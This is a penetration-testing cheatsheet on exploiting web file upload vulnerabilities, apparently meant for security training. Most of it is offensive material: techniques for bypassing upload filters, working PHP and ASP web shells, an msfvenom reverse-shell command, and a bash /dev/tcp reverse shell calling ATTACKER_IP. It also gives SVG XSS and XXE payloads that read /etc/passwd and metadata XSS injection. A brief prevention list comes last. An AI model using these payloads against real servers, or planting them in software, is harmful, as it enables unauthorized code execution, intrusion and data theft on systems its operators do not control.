# File Upload Vulnerabilities Cheatsheet

## Introduction

File upload vulnerabilities occur when a web server allows users to upload files without sufficiently validating their name, type, contents, or size. This can lead to RCE, XSS, XXE, or DoS.

---

## Methodology

1. **Fuzz Extensions**: Check which extensions are allowed.
2. **Fuzz Content-Type**: Change `Content-Type` header to `image/jpeg` or `image/png`.
3. **Magic Bytes**: Add valid file signatures (e.g., `GIF89a`) to the beginning of the file.
4. **Upload Web Shell**: Attempt to upload a shell and access it.

---

## Bypassing Filters

### 1. Frontend Validation

- **Disable JavaScript** in the browser.
- **Intercept Request**: Use Burp Suite to modify the file extension and content type after the frontend check passes.

### 2. Content-Type Validation

Change the `Content-Type` header in the POST request to a safe type.

```http
Content-Type: image/jpeg
```

### 3. Magic Bytes (MIME-Type)

Add magic bytes to the start of the file to trick the server into thinking it's an image.

- **GIF**: `GIF89a`
- **JPEG**: `\xFF\xD8\xFF\xE0`
- **PNG**: `\x89PNG\r\n\x1a\n`

**Example (GIF Bypass):**

```bash
echo "GIF89a; <?php system(\$_GET['cmd']); ?>" > shell.php.gif
```

### 4. Extension Bypassing

- **Double Extensions**: `shell.jpg.php` (if server checks for .jpg presence).
- **Reverse Double Extension**: `shell.php.jpg` (if server executes first extension it sees, e.g., Apache misconfig).
- **Alternative Extensions**:
  - **PHP**: `.php`, `.php2`, `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`, `.phps`
  - **ASP**: `.asp`, `.aspx`, `.cer`, `.asa`
  - **JSP**: `.jsp`, `.jspx`, `.jsw`, `.jsv`, `.jspf`
- **Special Characters**:
  - Null Byte: `shell.php%00.jpg` (PHP < 5.3.4)
  - Spaces/Newlines: `shell.php%20`, `shell.php%0a`
  - Trailing Dots: `shell.php.`
  - NTFS Streams (Windows): `shell.php::$DATA`

### 5. Windows Specific

- **Reserved Names**: `CON`, `PRN`, `AUX`, `NUL`, `COM1`, `LPT1`. (e.g., upload `web.config` as `web.config::$DATA` or similar techniques to overwrite).
- **8.3 Filename Convention**: `HAC~1.TXT` refers to `hackthebox.txt`. Use to overwrite files like `WEB~1.CON` for `web.config`.

---

## Exploitation

### Web Shells

**PHP:**

```php
<?php system($_REQUEST['cmd']); ?>
```

**ASP:**

```asp
<% eval(request("cmd")) %>
```

### Reverse Shells

**PHP (msfvenom):**

```bash
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw > reverse.php
```

**Bash (via Web Shell):**
URL Encode the payload!

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

### Advanced Attacks

- **XSS via SVG**:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
  ```
- **XXE via SVG**:
  ```xml
  <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <svg>&xxe;</svg>
  ```
- **XSS via Image Metadata**:
  ```bash
  exiftool -Comment='"><script>alert(1)</script>' image.jpg
  ```
- **DoS**:
  - **Pixel Flood**: Modify image dimensions to be huge (e.g., 0xffff x 0xffff).
  - **Zip Bomb**: Nested zip files that expand to petabytes.

---

## Prevention

1. **Whitelist Extensions**: Only allow safe extensions (e.g., `.jpg`, `.png`).
2. **Validate Content**: Check both MIME-Type and Magic Bytes. Ensure they match the extension.
3. **Rename Files**: Randomize filenames upon upload to prevent overwriting and finding the file.
4. **Store Outside Webroot**: Store files in a directory not accessible via the web server.
5. **Disable Execution**: Configure the web server to disable script execution in the upload directory.
   - Apache: `SetHandler None`
   - Nginx: `location /uploads { deny all; }` (for .php files)
6. **Disable Dangerous Functions**: `disable_functions` in `php.ini`.
